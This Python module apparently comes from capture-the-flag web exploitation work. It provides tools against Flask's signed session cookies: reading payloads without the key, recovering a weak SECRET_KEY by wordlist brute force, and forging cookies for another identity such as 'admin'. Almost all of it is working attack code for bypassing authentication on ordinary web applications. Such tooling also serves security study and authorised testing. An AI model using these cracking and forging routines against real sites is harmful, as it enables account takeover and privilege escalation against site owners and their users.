"""Signed-cookie primitives for web exploitation (Flask / itsdangerous session format).

Two lessons from live web challenges, turned into deterministic, dependency-free tools:

* A framework session cookie is *signed, not encrypted*. The server may stash secrets in
  it -- an OTP, a role, even the flag/proof -- and the client reads them without the key
  (`decode_payload`). This runs on the clock: no wordlist, one look at a cookie we already
  hold.
* When the cookie only carries identity (``{"username": "x"}``), a weak ``SECRET_KEY`` lets
  an attacker forge another identity. `crack_secret` recovers the key from a wordlist and
  `sign` mints a cookie the server accepts (e.g. ``{"username": "admin"}``). This is for
  untimed/offline use -- a wordlist pass is far too slow for a race.

Pure standard library, matching Flask's defaults (``key_derivation='hmac'``,
``salt='cookie-session'``, ``digest_method=sha1``); nothing here verifies a signature it
should not, and decoding never trusts the payload -- it only reads it.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import time
import zlib
from typing import Any, Iterable

DEFAULT_SALT = b"cookie-session"


def _b64decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def _b64encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _derive_key(secret: bytes, salt: bytes) -> bytes:
    # Flask's default key_derivation='hmac': HMAC(secret, salt, sha1).
    return hmac.new(secret, salt, hashlib.sha1).digest()


def _signature(secret: bytes, signed_part: str, salt: bytes) -> str:
    key = _derive_key(secret, salt)
    return _b64encode(hmac.new(key, signed_part.encode("utf-8"), hashlib.sha1).digest())


def _as_bytes(secret: str | bytes) -> bytes:
    return secret.encode("utf-8") if isinstance(secret, str) else secret


def decode_payload(cookie: str) -> Any | None:
    """The deserialised payload of a signed cookie, read without the key (or None).

    The signature is NOT checked -- this reads server-set session state, never trusts it.
    Handles the itsdangerous ``.``-prefixed zlib compression.
    """
    if not isinstance(cookie, str) or not cookie:
        return None
    value = cookie.rsplit(".", 2)[0] if cookie.count(".") >= 2 else cookie.split(".", 1)[0]
    compressed = value.startswith(".")
    segment = value[1:] if compressed else value
    if not segment:
        return None
    try:
        raw = _b64decode(segment)
        if compressed:
            raw = zlib.decompress(raw)
        return json.loads(raw)
    except (binascii.Error, ValueError, zlib.error, UnicodeDecodeError):
        return None


def verify(cookie: str, secret: str | bytes, *, salt: bytes = DEFAULT_SALT) -> bool:
    """True when `secret` signed `cookie` (constant-time compare)."""
    try:
        value, timestamp, provided = cookie.rsplit(".", 2)
    except (ValueError, AttributeError):
        return False
    expected = _signature(_as_bytes(secret), f"{value}.{timestamp}", salt)
    return hmac.compare_digest(expected, provided)


def crack_secret(cookie: str, words: Iterable[str | bytes], *, salt: bytes = DEFAULT_SALT) -> str | bytes | None:
    """The first word in `words` that signs `cookie`, or None. Offline only -- too slow to race."""
    try:
        value, timestamp, provided = cookie.rsplit(".", 2)
    except (ValueError, AttributeError):
        return None
    signed_part = f"{value}.{timestamp}"
    for word in words:
        if hmac.compare_digest(_signature(_as_bytes(word), signed_part, salt), provided):
            return word
    return None


def _encode_timestamp(now: int | None = None) -> str:
    now = int(time.time()) if now is None else now
    length = max(1, (now.bit_length() + 7) // 8)
    return _b64encode(now.to_bytes(length, "big"))


def sign(data: Any, secret: str | bytes, *, salt: bytes = DEFAULT_SALT,
         timestamp: int | None = None) -> str:
    """Mint a signed session cookie for `data` -- e.g. forge ``{"username": "admin"}``.

    Serialises `data` as compact JSON (the common case; tagged types are not needed to
    forge an identity), so the server deserialises and HMAC-verifies it with `secret`.
    """
    payload = _b64encode(json.dumps(data, separators=(",", ":")).encode("utf-8"))
    stamp = _encode_timestamp(timestamp)
    return f"{payload}.{stamp}.{_signature(_as_bytes(secret), f'{payload}.{stamp}', salt)}"


def proofs_in_cookies(cookie_values: Iterable[str], pattern: Any) -> list[str]:
    """Every `pattern` match found in a set of cookie values: in the raw value, and in a
    signed cookie's decoded payload. Used to read a proof the server stashed in a session.
    """
    found: list[str] = []
    for value in cookie_values:
        if not isinstance(value, str):
            continue
        match = pattern.search(value)
        if match:
            found.append(match.group(0))
        payload = decode_payload(value)
        if payload is not None:
            for text in _strings(payload):
                match = pattern.search(text)
                if match:
                    found.append(match.group(0))
    return found


def _strings(obj: Any) -> list[str]:
    out: list[str] = []
    stack = [obj]
    while stack:
        current = stack.pop()
        if isinstance(current, str):
            out.append(current)
        elif isinstance(current, dict):
            stack.extend(current.keys())
            stack.extend(current.values())
        elif isinstance(current, (list, tuple)):
            stack.extend(current)
    return out
